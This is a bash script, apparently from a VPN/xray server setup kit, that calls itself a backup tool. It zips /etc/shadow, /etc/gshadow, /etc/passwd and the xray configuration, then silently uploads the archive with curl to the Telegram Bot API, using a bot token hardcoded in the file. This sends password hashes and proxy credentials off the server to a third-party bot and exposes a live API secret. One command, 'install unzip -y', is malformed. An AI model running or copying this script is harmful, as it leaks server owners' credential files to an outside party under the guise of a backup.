#!/bin/bash
# ==========================================
# Color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
install unzip -y
# Getting
clear
figlet "Backup" | lolcat
echo "Mohon Menunggu , Proses Backup sedang berlangsung !!"
rm -rf /root/backup
mkdir /root/backup
cp /etc/passwd backup/
cp /etc/group backup/
cp /etc/shadow backup/
cp /etc/gshadow backup/
cp -r /etc/xray backup/xray
cd /root
zip -r backup.zip backup > /dev/null 2>&1

echo "Selesai"





curl -X POST https://api.telegram.org/bot6608829596:AAE946U43ef2GeJ1dD90TZjpTNfbo-n3Mb0/sendDocument \
     -F "chat_id=$(cat /root/id)" \
     -F "document=@/root/backup.zip" \
     -F "caption=File backup mu" &> /dev/null
     
